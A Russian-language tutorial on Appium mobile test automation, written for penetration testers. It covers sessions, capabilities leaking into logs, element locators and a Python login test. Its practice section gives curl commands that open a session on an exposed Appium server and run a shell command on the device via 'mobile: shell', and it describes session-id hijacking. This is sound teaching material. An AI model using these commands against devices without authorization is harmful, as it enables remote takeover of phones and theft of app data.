## Вопрос, с которого всё начинается

Тебе нужно проверить чужое Android-приложение: пройти регистрацию, залогиниться, дойти до
перевода и посмотреть, что произойдёт. Руками это минут десять на один прогон, а прогонов
нужно сто — с разными логинами, разными суммами, разными языками интерфейса. Сидеть и
кликать мышкой невозможно. Как заставить телефон нажимать кнопки сам?

## Что такое Appium

**Appium** — сервер, который принимает команды по сети и превращает их в реальные действия
на устройстве: тапы, ввод текста, свайпы. Команды описываются по стандарту **WebDriver** —
это тот же протокол, что используют браузерные тесты, только вместо браузера здесь
мобильное приложение.

Схема простая: твой тест (на Python, Java, JS — любом языке) шлёт HTTP-запросы на
Appium-сервер, а сервер через специальный драйвер общается с устройством. Для Android
драйвер называется **UiAutomator2**, для iOS — **XCUITest**. Именно поэтому один тест
может работать на обеих платформах: меняется только драйвер и пара настроек.

## Наш пример: поднимаем сессию

Прежде чем что-то нажимать, надо открыть **сессию** — это «разговор» Appium с конкретным
приложением на конкретном устройстве. Сессия создаётся запросом `POST /session`, в теле
которого лежат **capabilities** — словарь настроек. Вот как это выглядит в логе
Appium-сервера (именно этот лог ты разберёшь в практике):

```
[HTTP] --> POST /session {"capabilities":{"alwaysMatch":{
    "platformName":"Android",
    "appium:automationName":"UiAutomator2",
    "appium:appPackage":"com.example.bank",
    "appium:appActivity":".MainActivity"}}}
[HTTP] <-- POST /session 200 340 ms - 812
```

Читаем по частям. `platformName: Android` — на какой платформе играем. `automationName:
UiAutomator2` — каким драйвером. `appPackage` и `appActivity` — какое именно приложение
запустить. Ответ `200` и тело длиной 812 байт означает: сессия создана, дальше можно
командовать.

## Шаг 1: почему capabilities — это чувствительные данные

Взгляни на строку из лога, которую мы разберём в практике:

```
[Appium] capability leak: appium:appBuild = com.example.bank 3.4.1-debug
```

Здесь `appBuild` — это необязательная capability, куда тестировщик положил версию сборки.
Сама по себе она безобидна, но она **утекает в лог**, а лог часто прикладывают к отчётам и
тикетам. Если в capabilities случайно оказались токен, пароль или внутренний URL — они
уедут в отчёт. Отсюда правило пентеста: **читая чужой Appium-лог, всегда ищи capabilities
с секретами**. Это ровно та задача, что стоит перед тобой в практике ниже.

## Шаг 2: как искать элементы

После создания сессии тест должен найти кнопку. Appium ищет элементы по **локаторам** —
правилам «как опознать виджет». Основные стратегии:

- `id` — по идентификатору ресурса (`com.example.bank:id/login`);
- `accessibility id` — по метке доступности (удобно и для Android, и для iOS);
- `xpath` — по структуре дерева (мощно, но хрупко);
- `-android uiautomator` — нативный селектор Android.

Найти локатор вручную помогает **Appium Inspector** — отдельное окно, где видно дерево
виджетов и их атрибуты. Ты тыкаешь в элемент, он показывает готовый локатор.

## Шаг 3: минимальный тест

Вот скелет теста на Python, который логинится в приложении:

```python
from appium import webdriver
from appium.options.android import UiAutomator2Options

opts = UiAutomator2Options()
opts.platform_name = "Android"
opts.app_package = "com.example.bank"
opts.app_activity = ".MainActivity"

drv = webdriver.Remote("http://127.0.0.1:4723", options=opts)
drv.find_element("id", "com.example.bank:id/login").send_keys("alice")
drv.find_element("id", "com.example.bank:id/password").send_keys("hunter2")
drv.find_element("id", "com.example.bank:id/submit").click()
assert drv.find_element("id", "com.example.bank:id/balance").text
drv.quit()
```

Что здесь важно для пентестера: тест **воспроизводим**. Один раз написав эти пять строк,
ты можешь гонять их с разными данными и сравнивать ответы приложения. Именно так находят
расхождения в правах доступа (IDOR) и в обработке ввода.

## Шаг 4: где Appium уязвим

Appium — это сервер, слушающий порт (по умолчанию 4723). Если он слушает `0.0.0.0` без
аутентификации, **любой в сети может управлять твоим устройством**: читать экран, вводить
текст, запускать shell через `mobile: shell`. На пентесте инфраструктуры это находка:
открытый Appium-порт = захват устройства. Проверяй, слушает ли сервер только `127.0.0.1`.

## Что мы теперь знаем

- Appium — WebDriver-сервер, который управляет приложением по сети.
- Сессия открывается через `POST /session` с capabilities.
- Capabilities могут утекать в логи — их надо читать глазами пентестера.
- Элементы ищутся по локаторам, Appium Inspector помогает их подобрать.
- Открытый Appium-порт — это захват устройства, а не просто удобство.

## Практика: пробуем открытый Appium-порт

Если Appium слушает сеть без аутентификации, им можно управлять издалека. Проверяем:

```
$ curl -s http://10.0.0.5:4723/status | python3 -m json.tool
{
  "value": {
    "ready": true,
    "build": {"version": "2.5.1"},
    "message": "The server is running"
  }
}
```

`ready: true` и версия — значит, сервер доступен. Дальше создаём сессию и, если драйвер
поддерживает `mobile: shell`, выполняем команду **на устройстве**:

```
$ curl -s -X POST http://10.0.0.5:4723/session \
  -H 'Content-Type: application/json' \
  -d '{"capabilities":{"alwaysMatch":{"platformName":"Android","appium:automationName":"UiAutomator2"}}}'
$ curl -s -X POST http://10.0.0.5:4723/session/<id>/execute/sync \
  -H 'Content-Type: application/json' \
  -d '{"script":"mobile: shell","args":{"command":"id"}}'
```

Второй запрос вернёт вывод `id` с устройства. Открытый Appium — это фактически
**удалённое управление телефоном**.

## Таблица: capabilities и их риск

| Capability | Смысл | Риск утечки |
|------------|-------|-------------|
| `appPackage` / `appActivity` | что запускать | раскрывает внутренние имена |
| `appium:appBuild` | версия сборки | указывает на debug-сборку |
| `appium:app` | путь к APK/IPA | раскрывает пути на хосте |
| `appium:noReset` | не сбрасывать состояние | оставляет чужие данные |
| `appium:chromedriverArgs` | аргументы драйвера | может включить отладку webview |

## Захват устройства, а не «удобство»

Разработчики часто поднимают Appium с `--address 0.0.0.0`, чтобы тестировать с другого
хоста. С точки зрения пентеста это находка уровня «RCE на устройстве»: через
`mobile: shell` доступны чтение файлов приложения, экран, ввод текста, запуск других
приложений. Проверяй, слушает ли сервер только `127.0.0.1` (`ss -ltnp` на хосте).

## Если сработало / не сработало

- **Сработало:** `/status` отвечает `ready: true` с удалённого хоста, а `mobile: shell`
  возвращает вывод команды — сервер открыт и не защищён.
- **Не сработало:** `/status` доступен, но `POST /session` возвращает ошибку драйвера —
  возможно, на устройстве нет нужного приложения или драйвер не установлен. Пробуй
  другие `automationName` (`Espresso`, `XCUITest`).
- **Порт закрыт снаружи:** сервер слушает `127.0.0.1`. Вектор требует другого доступа
  (SSRF через тестовый прокси, доступ к localhost с самого хоста).

## Ограничения

Открытый порт — необходимое, но не достаточное условие: нужна ещё возможность создать
сессию (устройство подключено, драйвер поднят, приложение установлено). На продакшене
Appium почти не встречается; чаще он живёт в тестовых сетях. Но именно там и прячутся
debug-сборки с секретами в capabilities.

## Разбор: noReset и утечка состояния

Capability `noReset: true` оставляет приложение в состоянии между сессиями — это удобно
для скорости, но опасно: в логах и на устройстве остаются токены, кэш, аккаунты
предыдущего прогона. Для пентестера это находка: если сессия Appium переиспользует
состояние, чужие данные могут «протечь» в следующий тест. Проверяй, что сбрасывается
между прогонами (`fullReset`), и не логируются ли чувствительные поля.

## Webview и контексты

Гибридные приложения (WebView) требуют переключения **контекста**: нативные элементы
и HTML живут в разных мирах.

```
$ curl -s http://10.0.0.5:4723/session/<id>/contexts
{"value":["NATIVE_APP","WEBVIEW_com.example.bank"]}
```

Переключившись в `WEBVIEW_*`, можно работать с DOM внутри приложения — и, если там
осталась отладка, получить доступ к JS-контексту. Это отдельная поверхность: webview
часто содержит тот же код, что и веб-версия, но с ослабленными проверками.

## Ошибки при работе с Appium

- Доверять только `127.0.0.1`: проверять, не слушает ли сервер `0.0.0.0`.
- Оставлять секреты в capabilities — они попадают в логи и отчёты.
- Игнорировать `noReset` при анализе утечек состояния.
- Не переключать контекст и искать HTML-элементы в нативном дереве (их там нет).

## Разбор: команды mobile: и что они дают

Драйвер UiAutomator2 расширяет WebDriver набором `mobile:`-команд. Самые интересные для
пентеста:

| Команда | Что делает |
|---------|------------|
| `mobile: shell` | выполнить shell-команду на устройстве |
| `mobile: startActivity` | запустить activity по имени |
| `mobile: pushFile` | записать файл на устройство |
| `mobile: pullFile` | прочитать файл с устройства |
| `mobile: getContexts` | список webview-контекстов |

Комбинация `pullFile` (прочитать приватные данные приложения) и `shell` (выполнить код)
делает открытый Appium-сервер эквивалентом удалённого доступа к устройству. Проверка
на пентесте: слушает ли сервер только loopback, включена ли аутентификация, ограничен
ли набор команд.

## Разбор: что такое id сессии

Ответ `POST /session` содержит `sessionId`. Все дальнейшие команды адресуются именно к
нему: `POST /session/<id>/element`, `.../element/<eid>/click`. Сессия живёт, пока её не
закроют (`DELETE /session/<id>`) или пока не истечёт таймаут.

Для пентестера это важно по двум причинам. Во-первых, **перехваченный id** позволяет
другому клиенту управлять тем же устройством, пока сессия жива, — то есть утечка id в
логах или по сети даёт доступ. Во-вторых, если сервер не ограничивает число сессий,
одно устройство можно «захватить» параллельными подключениями. Проверяй, закрываются
ли сессии и есть ли лимит.

## Локаторы: XPath, accessibility id и uiautomator

Appium ищет элементы через стратегии (`locator strategy`). Выбор стратегии определяет и скорость, и устойчивость теста.

```python
# accessibility id — самый устойчивый, привязан к content-desc
el = driver.find_element(AppiumBy.ACCESSIBILITY_ID, "login-button")
# id ресурса (Android) / name (iOS)
el = driver.find_element(AppiumBy.ID, "com.target:id/username")
# XPath — мощный, но хрупкий и медленный
el = driver.find_element(AppiumBy.XPATH, "//android.widget.Button[@text='Войти']")
# UiAutomator (Android-only), условия на селекторе
el = driver.find_element(AppiumBy.ANDROID_UIAUTOMATOR,
    'new UiSelector().textContains("Войти").clickable(true)')
```

| Стратегия | Скорость | Устойчивость | Когда |
|-----------|----------|--------------|-------|
| `accessibility id` | высокая | высокая | всегда предпочтительно |
| `id` ресурса | высокая | средняя | Android, если id не локализован |
| XPath | низкая | низкая | крайний случай, сложные связи |
| `-android uiautomator` | средняя | средняя | Android, сложные условия |

Ловушки: XPath по тексту ломается при локализации (смена языка) и на скрытых элементах; `find_element` возвращает первый совпавший — при нескольких одинаковых нужен `find_elements` и индекс. Если элемент «не найден», смотрим реальное дерево:

```python
print(driver.page_source)            # XML-дерево текущего экрана
driver.save_screenshot("state.png")  # что реально на экране
```

Для WebView нужен переключённый контекст (`driver.contexts`, `driver.switch_to.context("WEBVIEW_...")`), иначе Selenium-стратегии не работают. Для нативных экранов контекст — `NATIVE_APP`. Смешение контекстов — самая частая причина «элемент есть, но не находится».

утечку.
